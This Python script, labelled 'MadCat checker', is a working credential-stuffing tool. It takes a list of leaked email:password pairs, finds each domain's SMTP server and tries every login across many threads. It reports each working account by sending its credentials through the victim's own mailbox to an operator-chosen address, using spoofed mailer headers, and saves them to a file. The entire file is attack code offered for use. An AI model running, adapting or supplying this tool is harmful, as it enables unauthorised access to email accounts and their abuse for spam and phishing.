import socket,threading,sys,ssl,smtplib,time,re,os,random,signal,queue,subprocess
from email.mime.text import MIMEText

try:
	import psutil,tqdm
	from dns import resolver
except ImportError:
	subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil tqdm dnspython'])
finally:
	import psutil,tqdm
	from dns import resolver

# ~~~~ SMTP checker script ~~~~~~~~~~~~~~~~~~
# ~~~~ MadCat checker v1.3 ~~~~~~~~~~~~~~~~~~
# ~~~~ https://github.com/aels/mailtools ~~~~
# ~~~~ contact: https://t.me/freebug ~~~~~~~~

if sys.version_info[0] < 3:
	raise Exception("Python 3 or a more recent version is required.")

class c:
	HEAD = "\033[95m"
	BLUE = "\033[94m"
	CYAN = "\033[96m"
	GREEN = "\033[92m"
	WARN = "\033[93m"
	FAIL = "\033[91m"
	END = "\033[0m"
	BOLD = "\033[1m"
	UNDERLINE = "\033[4m"

def get_mx_server(domain):
	global mx_cache, timeout
	if not domain in mx_cache:
		for data in resolver.resolve(domain, 'MX'):
			mx_host = data.exchange.to_text()[0:-1]
			break
		for h in [mx_host,domain,'smtp.'+domain,'mail.'+domain,'webmail.'+domain,'mx.'+domain]:
			for p in [587,465]:
				try:
					s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(1)
					if p==465:
						s = ssl.wrap_socket(s)
					s.connect((h, p))
					s.close()
					mx_cache[domain] = (h, str(p))
					return mx_cache[domain]
				except Exception as e:
					pass
		mx_cache[domain] = False
	return mx_cache[domain]

def quit(signum, frame):
	print('\b'*10+f'\n{c.CYAN}{c.BOLD}Exiting...{c.END}\n')
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'^[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}$', email.lower())

def find_email_password_collumnes(list_filename):
	email_collumn = False
	password_collumn = False
	with open(list_filename) as fp:
		for line in fp:
			line = re.sub('[;,\t| \'"]+', ':', line.lower())
			email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
			if email_collumn is False and email:
				email_collumn = line.split(email.group(0))[0].count(':') or 0
			if password_collumn is False and re.search(r'@.+123', line):
				password_collumn = line.split('123')[0].count(':')
			if email_collumn is not False and password_collumn is not False:
				return (email_collumn, password_collumn)
	password_collumn = email_collumn+1
	return (email_collumn, password_collumn)

def wc_count(filename):
	return int(subprocess.check_output(['wc', '-l', filename]).split()[0])

def is_ignored_host(mail):
	global exclude_mail_hosts
	for ignored_str in exclude_mail_hosts.split(','):
		if ignored_str in mail.split('@')[1]:
			return True
	return False

def smtp_connect_and_send(smtp_server, port, smtp_user, password):
	global verify_email, timeout
	message = MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8')
	message['From'] = f'MadCat checker <{smtp_user}>'
	message['To'] = verify_email
	message['Subject'] = 'new SMTP from MadCat checker'
	headers =f'Return-Path: {smtp_user}\n'
	headers+=f'Reply-To: {smtp_user}\n'
	headers+= 'X-Priority: 1\n'
	headers+= 'X-MSmail-Priority: High\n'
	headers+= 'X-Mailer: Microsoft Office Outlook, Build 10.0.5610\n'
	headers+= 'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\n'
	if port == '587':
		context = ssl.create_default_context()
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE
		server_obj = smtplib.SMTP(smtp_server, port, timeout=float(timeout))
		server_obj.starttls(context=context)
	elif port == '465':
		server_obj = smtplib.SMTP_SSL(smtp_server, port, timeout=float(timeout))
	else:
		server_obj = smtplib.SMTP(smtp_server, port, timeout=float(timeout))
	server_obj.ehlo()
	server_obj.login(smtp_user, password)
	server_obj.sendmail(smtp_user, verify_email, headers+message.as_string())
	server_obj.quit()

def worker_item(jobs_que, results):
	global threads_counter, verify_email, goods, no_jobs_left
	self = threading.current_thread()
	while True:
		if (mem_usage>90 or cpu_usage>90) and threads_counter>threads_count:
			break
		if jobs_que.empty():
			if no_jobs_left:
				break
			else:
				results.put(f'queue exhausted, {c.BOLD}sleeping...{c.END}')
				time.sleep(1)
				continue
		else:
			smtp_server, port, smtp_user, password = jobs_que.get()
			results.put(f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}')
			if not smtp_server or not port:
				try:
					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
				except Exception as e:
					continue
			results.put(f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}')
			try:
				smtp_connect_and_send(smtp_server, port, smtp_user, password)
				results.put(f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}')
				open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
				goods += 1
				time.sleep(1)
			except Exception as e:
				e = str(e).strip()[0:100]
				results.put(f'{smtp_server}:{port} - {c.FAIL}{c.BOLD}{e}{c.END}')
				open(errors_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password} - {e}\n")
	threads_counter -= 1

def every_second():
	global mem_usage, cpu_usage, jobs_que, results, threads_counter, no_jobs_left
	time.sleep(1)
	while True:
		if no_jobs_left and threads_counter == 0:
			break
		mem_usage = psutil.virtual_memory()[2]
		cpu_usage = max(psutil.cpu_percent(percpu=True))
		if mem_usage<80 and cpu_usage<80:
			threading.Thread(target=worker_item, args=(jobs_que,results), daemon=True).start()
			threads_counter += 1
		time.sleep(0.1)

signal.signal(signal.SIGINT, quit)
jobs_que = queue.Queue()
results = queue.Queue()
goods = 0
mem_usage = 0
cpu_usage = 0
threads_count = 50
threads_counter = 0
mx_cache = {}
timeout = 3
no_jobs_left = False

try:
	list_filename = sys.argv[1]
	smtp_filename = sys.argv[1].split('.')
	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
	smtp_filename = '.'.join(smtp_filename)
	errors_filename = smtp_filename.replace('_smtp', '_errors')
	verify_email = sys.argv[2]
	if not is_valid_email(verify_email):
		raise
	try:
		exclude_mail_hosts = sys.argv[3]
	except:
		exclude_mail_hosts = 'sorry,mom'
	try:
		start_from_line = int(sys.argv[4])
	except:
		start_from_line = 0
except:
	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com [exclude,mail,hosts] [start_from_line]')
email_collumn, password_collumn = find_email_password_collumnes(list_filename)
total_lines = wc_count(list_filename)
print(f'total lines to procceed: {c.BOLD}{str(total_lines)}{c.END}')
print(f'email coll: {c.BOLD}{str(email_collumn)}{c.END}, password coll: {c.BOLD}{str(password_collumn)}{c.END}')
print(f'verification email: {c.BOLD}{verify_email}{c.END}')
with tqdm.tqdm(total=total_lines,initial=start_from_line) as progress_bar, open(list_filename) as fp:
	threading.Thread(target=every_second, daemon=True).start()
	for i in range(int(start_from_line)):
		line = fp.readline()
	while True:
		while jobs_que.qsize()<threads_count*2:
			line = fp.readline().strip()
			if not line and line!='':
				no_jobs_left = True
				break
			if line.count('|')==3:
				jobs_que.put((line.split('|')))
			else:
				line = re.sub('[;,\t| \'"]+', ':', line)
				fields = line.split(':')
				if len(fields)>1 and is_valid_email(fields[email_collumn]) and len(fields[password_collumn])>7 and not is_ignored_host(fields[email_collumn]):
					jobs_que.put((False,False,fields[email_collumn],fields[password_collumn]))
				else:
					progress_bar.update(1)
		if not results.empty():
			thread_status = results.get()
			tqdm.tqdm.write(thread_status)
			if 'trying' in thread_status:
				progress_bar.set_description(f'mem: {c.BOLD}{mem_usage}{c.END}%, cpu: {c.BOLD}{cpu_usage}{c.END}%, threads: {c.BOLD}{threads_counter}{c.END}, goods: {c.BOLD}{c.GREEN}{goods}{c.END}')
				progress_bar.update(1)
		if threads_counter == 0 and no_jobs_left:
			progress_bar.close()
			print('\b'*10+f'{c.GREEN}{c.BOLD}All done.{c.END}')
			break
